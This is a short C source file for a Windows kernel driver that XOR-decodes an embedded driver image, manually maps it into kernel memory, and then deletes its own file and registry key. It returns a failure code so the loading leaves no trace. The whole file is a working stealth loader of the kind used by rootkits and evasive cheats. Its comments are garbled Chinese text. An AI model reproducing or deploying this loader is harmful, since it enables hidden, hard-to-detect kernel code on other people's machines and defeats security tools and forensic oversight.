#include <ntifs.h>
#include "Tools.h"
#include "Loader.h"
#include "dll.h"

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{

}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)
{
	ULONG dwImageSize = sizeof(sysData);

	unsigned char* pMemory = (unsigned char*)ExAllocatePool(NonPagedPool, dwImageSize);
	memcpy(pMemory, sysData, dwImageSize);

	for (ULONG i = 0; i < dwImageSize; i++)
	{
		pMemory[i] ^= 0xE9;
		pMemory[i] ^= 0xE8;
	}

	LoadDriver(pMemory);

	ExFreePool(pMemory);

	PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver->DriverSection;
	if (ldr)
	{
		DeleteSelfFile(ldr->FullDllName.Buffer);
	}

	//É¾³ý×¢²á±í
	DeleteRegisterPath(pReg);

	pDriver->DriverUnload = DriverUnload;

	return STATUS_UNSUCCESSFUL; //·µ»Ø´íÎó
}